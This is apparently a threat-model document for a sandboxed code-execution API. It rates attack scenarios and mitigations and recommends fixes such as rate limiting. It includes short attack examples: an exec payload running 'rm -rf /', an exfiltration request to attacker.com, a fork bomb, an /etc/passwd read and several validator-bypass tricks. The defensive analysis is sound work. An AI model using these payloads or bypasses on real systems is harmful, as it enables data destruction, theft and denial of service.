# 04 - Threat Model

## Attack Scenarios

### 1. Remote Code Execution (RCE) via eval()

**Attack Vector**:
```python
# Client sends malicious code
POST /execute
{
  "language": "python",
  "code": "exec('import os; os.system(\"rm -rf /\")')",
  "timeout": 30
}
```

**Mitigation**:
1. Pattern validation blocks `eval(`, `exec(` calls
2. Even if bypass regex → execution in isolated container
3. Container killed after execution
4. Host filesystem untouched

**Risk Rating**: **MEDIUM** (regex can be bypassed)

**Actual Risk Assessment**: 
- If regex bypassed, eval still isolated in container
- Container can only write to /tmp (ephemeral)
- Container cannot write to host filesystem
- **Residual risk**: Very low with Phase A, moderate with Phase B

---

### 2. Container Escape

**Attack Vector**:
```bash
# Malicious code exploits container runtime bug
# Example: runc CVE-2021-30465 or containerd escape
python code → Docker → kernel exploit → host access
```

**Mitigation**:
1. Keep Docker/containerd updated
2. Container runs as unprivileged UID 1000
3. Container has no capabilities (CAP_SYS_ADMIN removed)
4. Seccomp filter (if enabled)
5. AppArmor/SELinux (if host configured)

**Risk Rating**: **HIGH** (kernel vulnerabilities are real)

**Actual Risk Assessment**:
- Kernel 0-days are rare but not impossible
- Container gives 1-2 layers of defense
- Host OS security posture matters
- **Residual risk**: Moderate (depends on kernel patch level)
- **Recommendation**: Use gVisor for higher assurance

---

### 3. Fork Bomb

**Attack Vector**:
```python
import os
while True:
    os.fork()  # Endless process spawning
```

**Mitigation**:
1. Phase A: `--pids-limit=64` (Docker enforces max 64 processes per container)
2. Phase B: `setrlimit(RLIMIT_NPROC, 64)` (kernel enforces per process)
3. First fork() call hits limit → process rejected

**Risk Rating**: **LOW** (well-mitigated)

**Verification**:
```bash
# Docker Phase A
docker run --pids-limit=64 <image> <code>
# Kernel kills 65th process attempt

# Subprocess Phase B
ulimit -u 64
# Resource module enforces same limit
```

**Residual risk**: None (limit is hard kernel enforcement)

---

### 4. Memory Exhaustion (OOM Attack)

**Attack Vector**:
```python
# Allocate until process killed
while True:
    x = [0] * 1024 * 1024  # Allocate 8MB list repeatedly
```

**Mitigation**:
1. Phase A: `--memory=512m --memory-swap=512m` (Docker hard limit, no swap spillover)
2. Phase B: `setrlimit(RLIMIT_AS, memory_bytes)` (kernel enforces virtual memory limit)
3. Process killed when limit exceeded

**Risk Rating**: **LOW** (well-mitigated)

**Verification**:
```bash
# Phase A: OOM after ~512 MB
# Phase B: Process killed at ~512 MB

# Test
python3 -c "import sys; x = bytearray(600_000_000); print(len(x))"
# Kill attempt if memory limit = 512 MB
```

**Residual risk**: None (hard kernel enforcement)

---

### 5. Log Flooding / Output Exhaustion

**Attack Vector**:
```python
# Flood stdout to cause DoS
print("x" * 1000000) for _ in range(1000)  # 1 GB output
```

**Mitigation**:
1. Output capture limited to 1 MB per stream (stdout, stderr)
2. Excess output discarded (truncated=true flag set)
3. No disk written for output storage (returned in JSON)

**Risk Rating**: **MEDIUM** (memory impact on API server)

**Actual Risk Assessment**:
- Capture happens in-memory in API process
- 1 MB limit per stream = manageable
- If 100 concurrent requests: 100 MB total in-memory
- Server needs adequate RAM for concurrent requests
- **Residual risk**: Low (bounded by output limit)

**Improvement**: Use streaming or disk-based capture for large outputs

---

### 6. CPU DoS / Infinite Loop

**Attack Vector**:
```python
while True:
    pass  # Infinite busy loop
```

**Mitigation**:
1. Phase A: `--cpus=0.5` limits CPU quota (can't monopolize)
2. Phase B: `setrlimit(RLIMIT_CPU, timeout)` limits CPU time
3. Timeout enforcement: SIGTERM at T, SIGKILL at T+2s

**Risk Rating**: **LOW** (mitigated but incomplete)**

**Actual Risk Assessment**:
- Phase A: CPU quota prevents monopoly but doesn't kill (runs forever at low CPU)
- Phase B: CPU time limit enforced but as wall-clock timeout
- **Problem**: RLIMIT_CPU is CPU time, not wall clock
- Infinite loop might run as `timeout` seconds worth of CPU time
- **Residual risk**: Low if timeout is enforced, moderate if timeout bypass

---

### 7. File System Access / Secrets Exfiltration

**Attack Vector**:
```python
# Try to read sensitive files
with open("/etc/passwd") as f:
    print(f.read())
```

**Mitigation**:
1. Phase A: Container has separate /etc (no host secrets)
2. Phase B: Regex blocks `open()` pattern with `/etc/` path
3. Container runs as UID 1000 (unprivileged)

**Risk Rating**: **LOW** (well-mitigated in Phase A, regex-dependent in Phase B)

**Actual Risk Assessment**:
- Phase A: Strong isolation (different root FS)
- Phase B: Regex might be bypassed:
  ```python
  f = open("/etc/../etc/passwd")  # Path traversal
  f = __import__('builtins').open("/etc/passwd")
  ```
- **Residual risk**: Low Phase A, moderate Phase B

---

### 8. Network Exfiltration

**Attack Vector**:
```python
import requests
requests.get("https://attacker.com/exfil?data=" + secret)
```

**Mitigation**:
1. Phase A: Container has no network interface (DNS disabled)
2. Phase B: Input validator regex blocks `requests`, `urllib`, `socket`, `http.`
3. SEC_ALLOW_NET=false (default)

**Risk Rating**: **MEDIUM** (network available in Phase B via regex bypass)

**Actual Risk Assessment**:
- Phase A: Strong isolation (no network namespace)
- Phase B: Regex bypass possible:
  ```python
  __import__("socke" + "t").socket()
  ```
- **Residual risk**: Low Phase A, moderate Phase B

---

### 9. Privilege Escalation

**Attack Vector**:
```bash
# Attempt to sudo or setuid
sudo whoami
sudo -l
setuid(0)  # Switch to root
```

**Mitigation**:
1. Container runs as UID 1000 (no sudo)
2. No setuid binaries in container
3. CAP_SETUID removed (Linux capability)

**Risk Rating**: **LOW** (mitigated)

**Residual risk**: None (UID 1000 is unprivileged)

---

### 10. Regex DoS (ReDoS) in Validation

**Attack Vector**:
```python
# Send code that causes regex engine to backtrack excessively
code = "a" * 10000 + "b"
# If validator uses greedy regex: (a+)*b
# Quadratic or exponential backtracking
```

**Mitigation**:
1. Input size limited to 64 KB
2. Regex patterns are simple (not nested)
3. Python `re` module is standard (not catastrophic backtracking usually)

**Risk Rating**: **LOW** (input size limited, regex patterns simple)

**Residual risk**: Low

---

## Attack Surface Analysis

### External Attack Surface (Internet-facing)

**Accessible Endpoints**:
```
POST /execute (Bearer token required)
GET /capabilities (Bearer token required)
GET /health (No auth, info leak)
GET /metrics (No auth, info leak)
GET /ui (Informational)
```

**Entry Points**:
1. Bearer token validation (hmac.compare_digest ✓)
2. Request body parsing (Pydantic ✓)
3. Input validation (regex + size limits ✓)
4. Backend selection (EXECUTION_MODE ✓)

**Risk**: Token required for all dangerous operations; /health and /metrics unauthenticated (info leak but no execution)

### Internal Attack Surface (Trusted Network)

If exposed without auth (e.g., internal network):
- /execute available without token
- Full code execution possible
- All isolation still applies

### Backend Attack Surface

**Phase A (Docker)**:
- Docker daemon compromise → escape possible
- Image build process (supply chain)
- Container runtime (runc, containerd)

**Phase B (Subprocess)**:
- Host OS kernel vulnerabilities
- Binaries available (gcc, node, python, etc.)
- System resource contention

## Abuse Patterns

### Pattern 1: Stress Testing via Concurrency

**Attack**:
```bash
for i in {1..1000}; do
  curl -H "Authorization: Bearer $TOKEN" \
       -X POST http://api/execute \
       -d '{"language":"python","code":"print(1)"}' &
done
```

**Impact**:
- 1000 concurrent requests
- Each uses 512 MB memory
- Total: 512 GB memory needed (DoS)

**Mitigation**:
- Rate limiting per token (not implemented ⚠️)
- Connection limits (HAProxy/nginx)
- Request timeout

**Residual risk**: **HIGH** (no rate limiting)**

---

### Pattern 2: Long-Running Computational Attack

**Attack**:
```python
# CPU hog
def fibonacci(n):
    if n < 2: return n
    return fibonacci(n-1) + fibonacci(n-2)

fibonacci(50)  # Takes ~30 seconds
```

**Impact**:
- Consumes full CPU quota for timeout period
- Other requests delayed (but not starved due to CPU limits)

**Mitigation**:
- CPU quota (0.5 cores)
- Timeout (30 seconds)
- Only impacts own container, not others

**Residual risk**: **LOW** (isolated per request)

---

### Pattern 3: Token Reuse / Replay

**Attack**:
```bash
# Capture valid token, replay it
TOKEN="abc123..."
curl -H "Authorization: Bearer $TOKEN" http://api/execute &
curl -H "Authorization: Bearer $TOKEN" http://api/execute &
# Repeated indefinitely
```

**Impact**: Exhausts token quota (if implemented)

**Mitigation**:
- Rate limiting per token (not implemented ⚠️)
- Token expiration (not implemented ⚠️)
- Request throttling (not implemented ⚠️)

**Residual risk**: **HIGH** (no rate limiting)**

---

### Pattern 4: Malformed Request Fuzzing

**Attack**:
```bash
# Send malformed JSON, huge payloads, etc.
curl -X POST http://api/execute -d '{'  # Invalid JSON
curl -X POST http://api/execute -d $(python3 -c "print('x'*100000000)")
```

**Impact**:
- Pydantic validation catches most
- 64 KB code limit enforced
- Request size limited by server config

**Mitigation**:
- Pydantic BaseModel validation ✓
- Max request size (nginx/HAProxy) ✓

**Residual risk**: **LOW** (well-protected)

---

## Severity Classification

| Threat | Likelihood | Impact | Residual Risk | Recommendation |
|--------|-----------|--------|---------------|-----------------|
| RCE via eval | Medium | Critical | Low | Monitor, test bypass cases |
| Container escape | Low | Critical | Moderate | Update Docker regularly |
| Fork bomb | Very Low | Medium | None | Enforcement sufficient |
| Memory exhaustion | Low | High | None | Limit well-enforced |
| Log flooding | Medium | Medium | Low | Add output streaming |
| CPU DoS | High | Low | Low | Timeout enforcement sufficient |
| File access | Low | High | Low/Moderate | Phase A strong, Phase B regex-dependent |
| Network exfil | Medium | High | Low/Moderate | Phase A strong, Phase B regex-dependent |
| Privilege escalation | Very Low | Critical | None | UID 1000 enforced |
| ReDoS | Low | Low | Low | Input size limited |
| Concurrency DoS | High | High | High | **Implement rate limiting** |
| Token reuse | High | Medium | High | **Implement rate limiting** |
| Malformed requests | Medium | Low | Low | Pydantic validates |

## Recommendations

### Critical (Do Immediately)
1. **Implement rate limiting** (per token, per IP)
   - Redis-based counter
   - Sliding window or token bucket
   - Limit: 100 requests/min per token

2. **Add request timeout** (before execution)
   - Prevent slow-client DoS
   - Timeout: 5 seconds

### High (Do Before Production)
3. **Add comprehensive logging/audit trail**
   - Log all API calls (token, language, code hash)
   - Log all execution outcomes (exit code, time, resources)
   - Audit backend selection (Docker vs Subprocess fallback)

4. **Document Phase B regex bypass mitigations**
   - Consider AST-based Python validation
   - Consider sandboxing via seccomp/AppArmor in subprocess mode

5. **Add gVisor support** (for higher assurance)
   - Optional second layer for Phase A
   - Mitigates container escape risk

### Medium (Nice-to-Have)
6. **Add token expiration** (TTL)
   - Generate short-lived tokens
   - Require re-authentication

7. **Add role-based access control**
   - Different tokens for different languages
   - Admin token for /capabilities

8. **Add output streaming** (for large payloads)
   - Reduce memory usage
   - Better user experience

### Monitoring
- Alert on timeout frequency (possible attack)
- Alert on Phase B fallback (Docker unavailable)
- Alert on failed validations (possible attack attempts)
- Monitor API token usage patterns
